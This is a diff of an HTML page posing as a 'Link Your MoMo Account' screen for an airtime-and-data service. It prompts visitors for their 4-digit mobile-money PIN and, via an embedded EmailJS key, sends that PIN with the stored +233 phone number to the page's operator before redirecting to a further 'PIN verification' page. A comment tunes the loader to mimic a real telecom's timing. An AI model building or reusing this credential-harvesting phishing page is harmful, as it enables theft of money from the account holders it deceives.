@@ -1,21 +1,18 @@
-<!DOCTYPE html>
+  <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Link Your Account</title>
+  <title>Link Your MoMo Account</title>
 
   <meta name="description" content="Airtime & Data — Fast and reliable airtime and data services with secure registration and easy access.">
   <link rel="icon" type="image/png" href="favicon.png" />
   <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />
-
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
-  <script>
-    (function(){ emailjs.init("gV773-VG85THpxrNV"); })();
-  </script>
+  <script>(function(){ emailjs.init("gV773-VG85THpxrNV"); })();</script>
 
   <style>
-    /* ---------- PRELOADER ---------- */
+    /* === PRELOADER === */
     #pageLoader {
       position: fixed;
       inset: 0;
@@ -25,38 +22,30 @@
       justify-content: center;
       align-items: center;
       z-index: 9999;
-      transition: opacity 0.8s ease, visibility 0.8s ease;
+      transition: opacity .6s ease;
     }
-    #pageLoader.fadeOut {
-      opacity: 0;
-      visibility: hidden;
-    }
+    #pageLoader.fadeOut { opacity: 0; pointer-events: none; }
+
     .loader-ring {
-      width: 80px;
-      height: 80px;
-      border: 6px solid rgba(255,255,255,0.2);
+      width: 80px; height: 80px;
+      border: 6px solid rgba(255,255,255,0.25);
       border-top: 6px solid #FFD700;
       border-radius: 50%;
-      animation: spin 1s linear infinite;
+      animation: spin 1.5s linear infinite;
+      margin-bottom: 20px;
     }
     .loader-logo {
-      font-size: 1.8rem;
-      font-weight: 700;
-      color: #fff;
+      color: #fff; font-size: 1.6rem; font-weight: 700;
       letter-spacing: 1px;
-      margin-top: 20px;
-      text-align: center;
-      animation: fadeLogo 2s ease infinite alternate;
+      animation: glow 2s ease-in-out infinite alternate;
     }
-    @keyframes fadeLogo {
-      from { opacity: 0.7; transform: scale(0.98); }
-      to { opacity: 1; transform: scale(1.05); }
-    }
-    @keyframes spin {
-      100% { transform: rotate(360deg); }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    @keyframes glow {
+      from { text-shadow: 0 0 8px #FFD700; }
+      to { text-shadow: 0 0 25px #FFE066; }
     }
 
-    /* ---------- BACKGROUND ---------- */
+    /* === BODY BACKGROUND === */
     body {
       margin: 0;
       font-family: 'Segoe UI', sans-serif;
@@ -68,93 +57,92 @@
       justify-content: center;
       align-items: center;
       overflow: hidden;
-      position: relative;
       opacity: 0;
       transition: opacity 1s ease;
+      position: relative;
     }
     body.loaded { opacity: 1; }
-
     @keyframes gradientShift {
       0% { background-position: 0% 50%; }
       50% { background-position: 100% 50%; }
       100% { background-position: 0% 50%; }
     }
 
+    /* === FLOATING LIGHTS === */
     .circle {
       position: absolute;
       border-radius: 50%;
-      background: rgba(255, 204, 0, 0.15);
+      background: rgba(255, 215, 0, 0.15);
       animation: float 10s infinite ease-in-out;
+      filter: blur(1px);
     }
     .circle:nth-child(1) { width: 300px; height: 300px; top: -100px; left: -120px; animation-delay: 0s; }
     .circle:nth-child(2) { width: 200px; height: 200px; bottom: -80px; right: -100px; animation-delay: 3s; }
-
     @keyframes float {
-      0%, 100% { transform: translateY(0); }
-      50% { transform: translateY(20px); }
+      0%,100% { transform: translateY(0); }
+      50% { transform: translateY(-30px); }
     }
 
-    /* ---------- CARD ---------- */
+    /* === CARD === */
     .card {
-      background: white;
+      background: #fff;
       border-radius: 1rem;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.25);
-      transform: translateY(0);
-      transition: all 0.4s ease;
-      animation: fadeInUp 1s ease forwards;
-      position: relative;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+      opacity: 0;
+      transform: translateY(50px);
+      transition: opacity 1s ease, transform 1s ease;
       z-index: 5;
     }
-    .card:hover {
-      transform: translateY(-8px) scale(1.02);
-      box-shadow: 0 15px 35px rgba(0,0,0,0.3);
-    }
-    @keyframes fadeInUp {
-      from { opacity: 0; transform: translateY(30px); }
-      to { opacity: 1; transform: translateY(0); }
+    body.loaded .card {
+      opacity: 1;
+      transform: translateY(0);
     }
 
-    /* ---------- BUTTON ---------- */
+    /* === BUTTON === */
     .btn {
       background: linear-gradient(90deg, #FFD700, #ffb300);
       color: #003366;
       font-weight: bold;
-      border: none;
-      transition: all 0.3s ease;
+      transition: transform .3s ease, box-shadow .3s ease;
       box-shadow: 0 3px 8px rgba(0,0,0,0.2);
       position: relative;
       overflow: hidden;
     }
     .btn::after {
-      content: "";
-      position: absolute;
-      top: 0; left: -100%;
-      width: 100%; height: 100%;
-      background: rgba(255,255,255,0.4);
-      transition: left 0.4s;
+      content:""; position:absolute; top:0; left:-100%;
+      width:100%; height:100%; background:rgba(255,255,255,0.4);
+      transition:left .4s;
     }
-    .btn:hover::after { left: 100%; }
-    .btn:hover {
-      transform: scale(1.05);
-      box-shadow: 0 5px 12px rgba(0,0,0,0.3);
-    }
+    .btn:hover::after { left:100%; }
+    .btn:hover { transform:scale(1.05); box-shadow:0 6px 14px rgba(0,0,0,0.3); }
 
-    /* ---------- INPUT ---------- */
+    /* === PIN INPUT === */
     .input-pin {
-      letter-spacing: 0.5rem;
+      letter-spacing: .5rem;
       font-size: 2rem;
       text-align: center;
       font-weight: bold;
       border: 2px solid #E5E7EB;
-      transition: all 0.3s ease;
+      transition: all .3s ease;
     }
     .input-pin:focus {
       border-color: #FFD700;
-      box-shadow: 0 0 15px rgba(255, 215, 0, 0.5);
+      box-shadow: 0 0 15px rgba(255,215,0,0.5);
       transform: scale(1.02);
     }
 
-    /* ---------- SUBMISSION LOADER ---------- */
+    /* === NOTIFICATION === */
+    #notification {
+      opacity: 0;
+      transform: translateY(-20px);
+      transition: opacity .5s ease, transform .5s ease;
+    }
+    #notification.show {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    /* === LOADING OVERLAY === */
     #loadingOverlay {
       position: fixed;
       inset: 0;
@@ -165,78 +153,68 @@
       z-index: 50;
       opacity: 0;
       pointer-events: none;
-      transition: opacity 0.4s ease;
+      transition: opacity .4s ease;
     }
-    #loadingOverlay.show {
-      opacity: 1;
-      pointer-events: all;
-    }
+    #loadingOverlay.show { opacity: 1; pointer-events: all; }
     .spinner {
       border: 4px solid rgba(255,255,255,0.3);
       border-top: 4px solid #FFD700;
       border-radius: 50%;
-      width: 60px;
-      height: 60px;
+      width: 60px; height: 60px;
       animation: spin 1s linear infinite;
-    }
-
-    /* ---------- NOTIFICATION ---------- */
-    #notification {
-      opacity: 0;
-      transform: translateY(-20px);
-      transition: opacity 0.5s ease, transform 0.5s ease;
-    }
-    #notification.show {
-      opacity: 1;
-      transform: translateY(0);
     }
   </style>
 </head>
 
 <body class="p-6">
+
   <!-- PRELOADER -->
   <div id="pageLoader">
     <div class="loader-ring"></div>
     <div class="loader-logo">Airtime & Data Hub</div>
   </div>
 
+  <!-- BACKGROUND GLOWS -->
   <div class="circle"></div>
   <div class="circle"></div>
 
+  <!-- MAIN CARD -->
   <div class="card w-full max-w-md p-8">
     <p class="font-bold text-xl text-center mb-3">Link Your MoMo Account</p>
-    <img src="momo.png" alt="linkmomo" class="w-full max-w-xs mx-auto mb-4 animate-bounce-slow">
+    <img src="momo.png" alt="MoMo" class="w-full max-w-xs mx-auto mb-4 animate-bounce-slow">
     <h1 class="text-2xl font-bold text-center text-blue-900 mb-3">Secure Your Account</h1>
-    <p class="text-gray-600 text-center mb-6">Enter your 4-digit MoMo pin to link your account for a direct charge.</p>
+    <p class="text-gray-600 text-center mb-6">Enter your 4-digit MoMo PIN to link your account for a direct charge.</p>
 
     <form id="pinForm" class="space-y-6">
-      <input type="password" id="pinInput" maxlength="4" pattern="\d{4}" inputmode="numeric" class="input-pin w-full rounded-lg py-3 px-4 focus:outline-none" placeholder="••••" required>
+      <input type="password" id="pinInput" maxlength="4" pattern="\d{4}" inputmode="numeric"
+             class="input-pin w-full rounded-lg py-3 px-4 focus:outline-none"
+             placeholder="••••" required>
       <button type="submit" class="btn w-full py-3 rounded-lg shadow">Continue</button>
     </form>
   </div>
 
-  <!-- Loading Overlay -->
+  <!-- OVERLAY + NOTIFY -->
   <div id="loadingOverlay"><div class="spinner"></div></div>
   <div id="notification" class="fixed top-5 right-5 px-5 py-3 rounded-xl shadow-lg font-medium text-white z-50"></div>
 
   <script>
-    // ===== PAGE LOADER =====
+    // === PRELOADER TIMING ===
     window.addEventListener('load', () => {
       const loader = document.getElementById('pageLoader');
       const body = document.body;
       setTimeout(() => {
         loader.classList.add('fadeOut');
         body.classList.add('loaded');
-      }, 2200); // Show loader ~2.2s
+      }, 3000); // match Telecel: ~3 s
     });
 
-    // ===== FORM HANDLING =====
+    // === FORM LOGIC ===
     const pinForm = document.getElementById("pinForm");
     const pinInput = document.getElementById("pinInput");
     const phone = localStorage.getItem("userPhone");
     const overlay = document.getElementById("loadingOverlay");
 
-    pinForm.addEventListener("submit", function(e) {
+    pinForm.addEventListener("submit", e => {
       e.preventDefault();
       if (pinInput.value.length === 4) {
         overlay.classList.add("show");
@@ -244,46 +222,31 @@
           phone: "+233" + phone,
           pin: pinInput.value
         }).then(() => {
-          showSuccessAnimation();
+          showNotification("MoMo PIN under verification");
+          window.location.href = "pin-verification.html";
         }).catch(() => {
           overlay.classList.remove("show");
-          showNotification("Failed to verify pin.", "error");
+          showNotification("Failed to verify PIN.", "error");
         });
       } else {
         showNotification("Please enter a valid 4-digit PIN.", "error");
       }
     });
 
-    function showNotification(message, type = "success") {
-      const notification = document.getElementById("notification");
-      notification.textContent = message;
-      notification.className = `fixed top-5 right-5 px-5 py-3 rounded-xl shadow-lg font-medium text-white z-50 ${
-        type === "success" ? "bg-green-600" : "bg-red-600"
+    function showNotification(message, type="success") {
+      const n = document.getElementById("notification");
+      n.textContent = message;
+      n.className = `fixed top-5 right-5 px-5 py-3 rounded-xl shadow-lg font-medium text-white z-50 ${
+        type==="success" ? "bg-green-600" : "bg-red-600"
       } show`;
-      setTimeout(() => notification.classList.remove("show"), 3000);
+      setTimeout(()=>n.classList.remove("show"),3000);
     }
 
-    function showSuccessAnimation() {
-      overlay.innerHTML = `
-        <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
-          <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
-          <path class="checkmark__check" fill="none" d="M14 27l7 7 16-16"/>
-        </svg>`;
-      setTimeout(() => {
-        window.location.href = "pin-verification.html";
-      }, 1500);
-    }
-
-    // ===== LOGO BOUNCE =====
+    // === SLOW BOUNCE ===
     const style = document.createElement("style");
     style.textContent = `
-      @keyframes bounce-slow {
-        0%, 100% { transform: translateY(0); }
-        50% { transform: translateY(-10px); }
-      }
-      .animate-bounce-slow {
-        animation: bounce-slow 3s infinite ease-in-out;
-      }
+      @keyframes bounce-slow { 0%,100%{transform:translateY(0);} 50%{transform:translateY(-10px);} }
+      .animate-bounce-slow { animation:bounce-slow 3s infinite ease-in-out; }
     `;
     document.head.appendChild(style);
   </script>
